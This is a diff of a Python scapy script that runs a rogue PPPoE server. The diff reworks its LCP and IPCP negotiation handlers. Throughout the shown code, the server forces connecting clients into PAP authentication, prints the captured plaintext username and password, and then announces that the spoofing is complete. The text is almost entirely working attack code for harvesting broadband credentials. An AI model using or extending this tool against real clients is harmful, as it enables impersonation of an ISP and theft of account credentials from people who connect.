@@ -19,6 +19,10 @@ MAC_ADDRESS = "0a:0a:0a:0a:0a:0a"
 # 会话 id，可自定义
 SESSION_ID = 0x0005
 
+# LCP Options Type
+TYPE_MAX_RECEIVE_UNIT = 0x01
+TYPE_MAGIC_NUM = 0x05
+
 
 # 获取一个随机的 mac 地址
 def get_mac_address():
@@ -48,7 +52,6 @@ class PPPoEServer(object):
     
     def __init__(self):
         self.ipaddr_bytes = get_host_ip_bytes()
-        self.clientMap = {}
         self.magic_num = b'\x25\x5f\xc5\xcb'
         self.username = None
         self.password = None
@@ -74,7 +77,7 @@ class PPPoEServer(object):
                 0x8864:{
                     "proto":{
                         # LCP 链路处理
-                        0xc021: self.send_lcp,
+                        0xc021: self.handle_lcp,
                         # PAP 协议处理
                         0xc023: self.handle_pap,
                         # IPCP 协议处理
@@ -91,48 +94,37 @@ class PPPoEServer(object):
                         handle_func(pkt)
 
     #处理 PPP LCP 请求
-    def send_lcp(self, pkt):
-        # 初始化 clientMap
-        if not self.clientMap.get(pkt.src):
-            print("----------会话阶段----------")
-            self.clientMap[pkt.src] = {"req": 0, "ack": 0}
-            
+    def handle_lcp(self, pkt):
         # 处理 LCP-Configuration-Req 请求
         if bytes(pkt.payload)[8] == 0x01:
-            # 第一次 LCP-Configuration-Req 请求返回 Rej 响应包
-            if self.clientMap[pkt.src]['req'] == 0:
-                self.clientMap[pkt.src]['req'] += 1
-                print("第 %d 次收到LCP-Config-Req" % self.clientMap[pkt.src]["req"])
-                print("处理Req请求，发送LCP-Config-Rej包")
+            print("收到 LCP-Config-Req")
+            # 当 Req 请求里面包含除 MRU 和魔术数以及 AuthProto 之外的字段时，返回 Rej
+            if len(pkt.payload.options) > 3:
+                print("发送 LCP-Config-Rej 包")
                 self.send_lcp_reject_packet(pkt)
-                print("发送LCP-Config-Req包")
+                print("发送 LCP-Config-Req 包")
                 self.send_lcp_req_packet(pkt)
-            # 后面的 LCP-Configuration-Req 请求均返回 Ack 响应包
             else:
-                self.clientMap[pkt.src]['req'] += 1
-                print("第 %d 次收到LCP-Config-Req" % self.clientMap[pkt.src]["req"])
-                print("处理Req请求，发送LCP-Config-Ack包")
+                print("发送 LCP-Config-Ack 包")
                 self.send_lcp_ack_packet(pkt)
-
         # 处理 LCP-Configuration-Rej 请求
         elif bytes(pkt.payload)[8] == 0x04:
-            print("处理Rej请求，发送LCP-Config-Req包")
+            print("收到 LCP-Config-Rej")
+            print("发送 LCP-Config-Req 包")
             self.send_lcp_req_packet(pkt)
-
         # 处理 LCP-Configuration-Ack 请求
         elif bytes(pkt.payload)[8] == 0x02:
-            self.clientMap[pkt.src]['ack'] += 1
-            print("第 %d 次收到LCP-Config-Ack" % self.clientMap[pkt.src]["ack"])
+            print("收到 LCP-Config-Ack")
         else:
             pass
     
     # IPCP 协议处理
     def handle_ipcp(self, pkt):
         payload = bytes(pkt.payload)
-        # req 请求处理
+        # 处理 IPCP-Configuration-Req 请求
         if payload[8] == 0x01:
             # 当 Req 请求的 options 有 ip dns 之外的字段，发送 rej
-            if len(payload[12:]) != 18:
+            if len(pkt.payload.options) > 3:
                 self.send_ipcp_rej_packet(pkt)
             # 当 Req 请求的 ip 以 0 开头时(0.0.0.0)，发送 nak 开始分配 ip
             elif payload[14] == 0x00:
@@ -149,26 +141,6 @@ class PPPoEServer(object):
         options = b'\x82\x06\x00\x00\x00\x00\x84\x06\x00\x00\x00\x00'
         length = len(options) + 4
         _payload = struct.pack('!BBH', code, identifier, length) + options
-        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0x8021) / _payload
-        scapy.sendp(_pkt)
-    
-    # 静态分配发送 IPCP-Configuration-Req
-    def send_ipcp_req_static_packet(self, pkt):
-        code = 0x01
-        identifier = 0x01
-        options = bytes(pkt.payload)[12:]
-        ipcp_len = len(options) + 4
-        _payload = struct.pack('!BBH', code, identifier, ipcp_len) + options
-        _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0x8021) / _payload
-        scapy.sendp(_pkt)
-    
-    # 动态分配发送 IPCP-Configuration-Req
-    def send_ipcp_req_dynamic_packet(self, pkt):
-        code = 0x01
-        identifier = 0x01
-        options = b'\x03\x06' + self.ipaddr_bytes[:2] + b'\x01\x01'
-        ipcp_len = len(options) + 4
-        _payload = struct.pack('!BBH', code, identifier, ipcp_len) + options
         _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0x8021) / _payload
         scapy.sendp(_pkt)
         
@@ -205,11 +177,11 @@ class PPPoEServer(object):
             self.username = _userName.decode('utf-8')
             self.password = _passWord.decode('utf-8')
             print("账户: %s\n密码: %s" % (self.username, self.password))
+            # 拒绝认证
             #self.send_pap_authreject(pkt)
             #self.send_lcp_end_packet(pkt)
+            # 通过认证
             self.send_pap_authack(pkt)
-            if pkt.src in self.clientMap:
-                del self.clientMap[pkt.src]
 
             print("欺骗完毕....")
     
@@ -246,11 +218,16 @@ class PPPoEServer(object):
         _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0xc021) / _payload
         scapy.sendp(_pkt)
 
-    #发送lcp-config-req回执包
+    #发送 lcp-config-req 请求
     def send_lcp_req_packet(self, pkt):
-        # 服务端声明使用PAP认证
-        auth_proto = b'\x01\x04\x05\xd4\x03\x04\xc0\x23\x05\x06\x5e\x63\x0a\xb8'
-        _payload = b'\x01\x01\x00\x12' + auth_proto
+        code = 0x01
+        identifier = 0x01
+        _opt_MRU = b'\x01\x04\x05\xd4'
+        _opt_auth_proto = b'\x03\x04\xc0\x23'   # 服务端声明使用PAP认证
+        _opt_magic_num = b'\x05\x06\x5e\x63\x0a\xb8'
+        options = _opt_MRU + _opt_auth_proto + _opt_magic_num
+        length = len(options) + 4
+        _payload = struct.pack('!BBH', code, identifier, length) + options
         _pkt = Ether(src=pkt.dst, dst=pkt.src, type=0x8864) / PPPoED(version=1, type=1, code=0x00, sessionid=SESSION_ID) / PPP(proto=0xc021) / _payload
         scapy.sendp(_pkt)
     
